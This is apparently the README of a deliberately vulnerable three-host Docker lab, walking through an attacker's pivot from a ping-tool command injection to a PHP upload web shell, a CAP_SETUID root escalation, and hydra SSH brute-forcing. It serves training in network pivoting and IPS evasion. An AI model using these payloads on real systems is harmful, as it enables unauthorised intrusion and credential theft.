# IPvLab — route-jumping intranet lab (attacker's perspective)

Three machines behind each other. The **only** machine directly reachable from the
attacker network is **m1**. There is **no SSH on m1 or m2** — the attacker cannot just
`ssh` into them, and m1/m2 cannot be reached by name. Only **m3** exposes SSH, and it
sits on the innermost network.

Goal: walk the router chain as an attacker, pivoting hop by hop, and finally brute-force
`m3`'s SSH with `crunch + hydra` from the attacker's own machine.

```
            attacker                      10.10.10.2          10.20.20.3           10.30.30.3
    +----------------+                +-----------+          +-----------+         +-----------+
    |  10.10.10.3    |  only m1       |     m1    |  m1->?   |     m2    |  m2->?   |     m3    |
    |  (no ssh)      |  direct        | router+    |  only    | router+   |  only    | DVWA +    |
    |  routes added  +----------------+ webapp     |  m2      | webapp    |  m3      | sshd :22  |
    |  manually      |   10.10.10.2   | 80,8080    +----------+ upload-RCE+----------+           |
    +----------------+                +-----------+ 10.20.20.3+-----------+ 10.30.30.2+-----------+
```

- **m1** (`10.10.10.2`, faces the attacker): **PingSweeper**, a vulnerable "ping" web tool
  (`pingsvc.py` listening on `:8080`; socat fronts expose the same app on `80/443/8443`).
  A GET to `/ping?ip=<host>` runs the value through `ping -c 3 <ip>` in a shell —
  chained input (`;`, `|`, `&&`) is **OS command injection** as the `webapp` user.
  m1 also runs an **authoritative DNS** for the `ipvlab.lab` domain on `:53`
  (UDP+TCP, no recursion, open AXFR — a passive-recon playground, see below).
  m1 runs an **IPS** in front (see below) and routes only toward m2 (`10.20.20.0/24`);
  its own OUTPUT toward m3 is logged + rejected.
- **m2** (`10.20.20.3`): **JumpWeb**, a "file drop" page with a `wwwrun`-owned upload that
  accepts any extension and executes `.php` — a walking PHP-RCE. Plus a `python3.12` wielding
  `CAP_SETUID`+`CAP_SETGID` so the jumped id can escalate to root and read `/root/hint.txt`.
- **m3** (`10.30.30.3`): DVWA (`:80`) and **`sshd :22`** (the only SSH in the lab).
  SSH is brute-forced with `crunch`+`hydra` from the attacker's own machine over the
  routed 2-hop chain.

## m1's IPS: open to humans, dead to scanners

m1 does **not** hide its services behind a port-knock. The app ports
`80/443/8080/8443` are **open by default** — an honest client (curl/browser) is served
normally and is never blacklisted. What m1 *does* do is watch how those packets are formed:

| behavior | trigger | result |
|----------|---------|--------|
| honest web traffic | NEW TCP to `80/443/8080/8443` | accepted (`FW-ACCEPT-NEW`) |
| hostile-flag probes (NULL/XMAS/FIN/bare-ACK `-sN/-sX/-sF/-sA`) | 2 in 10 s | source blacklisted 120 s |
| NEW SYN to a closed port (default `-sS` sweep) | 5 in 60 s | source blacklisted 120 s |

Anything else reads `closed` (`FW-BLOCK`, RST). Once blacklisted, **every** packet from
that source — INPUT *and* anything forwarded through m1 — is dropped for **120 seconds**
(`FW-BLACKLIST`, `recent --name BL`), then the source recovers automatically.

> The point: a noisy `nmap ... 10.10.10.2` starts working normally, then the source
> suddenly reads as **all `filtered` / host down** for the next 120 s, and even a plain
> `curl` goes unanswered during the ban. Wait it out and the host is back. This is a
> deliberate teaching moment — probe loud, get cut off; walk in like a human.

Counter telemetry per IPS chain (`FW-ACCEPT-NEW`, `FW-SCAN-GATE`, `FW-BLACKLIST`,
`FW-BLOCK`) is printed to m1's logs every 10 s by `fwlog.sh`:

```
docker logs ipvlab-m1 --since 1m | grep FWLOG
# [..][m1][FWLOG] FW-ACCEPT-NEW[pkts=N bytes=N] FW-SCAN-GATE[...] FW-BLACKLIST[...] FW-BLOCK[...]
```

## Firewall / routing contract (per hop)

| Host | OUTPUT (originated)          | FORWARD (transit)                                |
|------|------------------------------|--------------------------------------------------|
| m1   | only `10.20.20.0/24`; `10.30.30.0/24` REJECTED | attacker→m2; SNAT so m2 sees m1 |
| m2   | only `10.30.30.0/24`         | m1→m3 (SSH/DVWA ports), SNAT so m3 sees m2 |
| m3   | —                            | reply path through the chain                    |

m1 also answers DNS (`:53` UDP+TCP only from the attacker side) and is the lab's
authoritative server for `ipvlab.lab`. A blacklisted source is dropped on both `INPUT`
and `FORWARD`, so a banned host can't even transit m1 to reach m2/m3 until its 120 s
expires.

## Attack path (full walkthrough, validated)

### 0. Setup on the attacker machine (your host / stand-in)

The attacker box only sees m1. Point the routes *through* the hop you've owned:

```
# one hop: reach m2 via m1
ip route add 10.20.20.0/24 via 10.10.10.2
# two hops: reach m3 via m1 then m2
ip route add 10.30.30.0/24 via 10.10.10.2
```

### 1. Recon — DNS, PingSweeper, quietly

m1 is authoritative for the `ipvlab.lab` domain (`:53`, UDP+TCP) and — deliberately —
allows **open AXFR**, so a full dump of the zone is one command away:

```
dig +noall +answer AXFR ipvlab.lab @10.10.10.2
# -> SOA/NS on m1, CNAMEs (www/web/api), a 10.10.10.2 A-record farm
#    (dev, staging, qa, blog, mail, vpn ...) and TXT intel:
#    *_dmarc TXT, "Security lab target - start at m1, pivot deeper", ops contact*
```

Passive nibbles:

```
dig @10.10.10.2 ipvlab.lab AXFR       # open zone transfer (the juicy one)
dig @10.10.10.2 -x 10.10.10.2         # PTR? (how the zone is shaped)
nmap -Pn -sS -p 80,8080,443,8443 10.10.10.2     # the four app ports
curl -s http://10.10.10.2/                       # PingSweeper form
curl -s http://10.10.10.2/robots.txt             # -> disallowed paths below
curl -s http://10.10.10.2/config.bak             # [ping]/[admin] config
curl -s http://10.10.10.2/admin.html             # "default login: admin/admin"
```

PingSweeper ships hidden recon fodder (`/robots.txt` points at them): `/robots.txt`,
`/backup.php` (legacy `system("ping -c 3 ".$ip)` handler), `/config.bak`,
`/.git/HEAD` (`ref: refs/heads/main`), `/index.js` (`/ping?ip=` call site),
`/admin.html` (admin/admin console). Do **not** `-p-`/default-scan m1 unless you want
the 120 s IPS timeout.

### 2. m1 — command injection in the ping tool

The `/ping` handler trusts `ip`. Chain a command:

```
curl -s "http://10.10.10.2/ping?ip=127.0.0.1;id"
# -> uid=101(webapp) ...
```

The same works on `:8080` directly, or over the socat fronts on `:443`/`:8443`.

### 3. Chain the routers (m1 → m2)

m1 routes to `10.20.20.0/24`? Yes. Now the attacker can reach m2; its 80 is JumpWeb, a
`wwwrun`-owned upload that allows any extension and executes `.php`.

### 4. m2 — upload where extensions aren't filtered

```
# Drop a PHP shell into /uploads:
POST /upload.php  file="shell.php"   (content: <?php system($_GET['c'] ?? '')?>)
# then:
curl "http://10.20.20.3/uploads/shell.php?c=id"
# -> uid=100(wwwrun)
```

### 5. m2 — CAP_SETUID python escalates to root

m2 ships a capability-laden `python3.12` (`cap_setuid,cap_setgid=ep`). A jump through it
becomes root:

```
curl "http://10.20.20.3/uploads/shell.php?c=python3.12%20-c%20%22import%20os;os.setuid(0);os.setgid(0);print(open(%27/root/hint.txt%27).read())%22"
# -> m3 = 10.30.30.3, ssh user: marvel, pass: 5 chars from charset {abcde12345!@#$%}, DVWA on :80
```

### 6. m3 — the only SSH; brute it from YOUR machine

The hint gives the DH: `user=marvel`, password = **5 chars from {abcde12345!@#$%}**.

```
crunch 5 5 abcde12345!@#$% -o /tmp/pass.txt
hydra -l marvel -P /tmp/pass.txt ssh://10.30.30.3 -t 32 -f
# -> [22][ssh] login: marvel  password: aaa12
```

### 7. Reach DVWA through the local tunnel

With the SSH creds, forward m3's 80 back to your machine and browse DVWA locally:

```
ssh -o StrictHostKeyChecking=no -L 127.0.0.1:38080:127.0.0.1:80 marvel@10.30.30.3
curl http://127.0.0.1:38080/login.php   # -> DVWA login page, 200
```

## Verification matrix (validated live this session)

| Step | Command | Expected |
|------|---------|----------|
| DNS zone | `dig @10.10.10.2 ipvlab.lab AXFR` | SOA/NS + CNAME farm + `admin` A record |
| app open | `curl http://10.10.10.2/` | PingSweeper form (HTTP 200) |
| app open, honest client | 8x `curl http://10.10.10.2/` | all 200; source **not** blacklisted |
| IPS triggered | `nmap -Pn -sS --top-ports 300 10.10.10.2` | shows open 80/8080, then `filtered`/dead |
| ban active | `curl http://10.10.10.2/` | `000` (dropped); BL has `10.10.10.3` |
| ban active (transit) | `curl http://10.30.30.3/` | `000` via the banned FORWARD path |
| auto-recovery | wait 120 s at zero traffic | `curl` → 200 again, BL inert |
| m1 RCE | `curl "/ping?ip=127.0.0.1;id"` | `uid=101(webapp)` on :80 and :8080 |
| m2 RCE | `curl "/uploads/shell.php?c=id"` | `uid=100(wwwrun)` |
| m2→root | cap-setuid python3.12 | `uid=0(root)` + hint.txt |
| m2→m3 transit | `nc 10.30.30.3 22` | SSH banner `SSH-2.0-OpenSSH...` |
| DVWA via 2-hop | `curl http://10.30.30.3/login.php` | HTTP 200 |
| hydra | `ssh://10.30.30.3` | `marvel:aaa12` |
| tunnel | `curl 127.0.0.1:38080/login.php` | HTTP 200 DVWA |
| bad login | `curl http://10.10.10.2/backup.php` | legacy ping handler page |

## Notes / deliberate choices

- **No sshd on m1/m2**: the attacker cannot "just log in"; everything is hop-by-hop pivoting.
- SSH exists only on m3 (DVWA host) and is the *target* of the brute-force exercise.
- m1 hosts the lab DNS (`named`, authoritative-only for `ipvlab.lab`, open AXFR) so zone
  transfer is a first-class recon step; it is deliberately **not** a recursion/open resolver.
- m1's IPS (chains `FW-ACCEPT-NEW`/`FW-SCAN-GATE`/`FW-BLACKLIST`/`FW-BLOCK`) deliberately
  keeps app ports open to honest traffic, **auto-blacklists loud scanners for 120 s**, and
  logs per-chain counters. There is no hidden knock — a quiet human gets served, a
  noisy scanner gets cut off.
- `netfix`/root-route automation is deliberately **removed from compose**: m1's transit is
  baked into its firewall/route (m1 still can NEVER originate connections to m3's side).
- The stand-in (`att`) is run on the host/docker host and only used to *steer* the demo.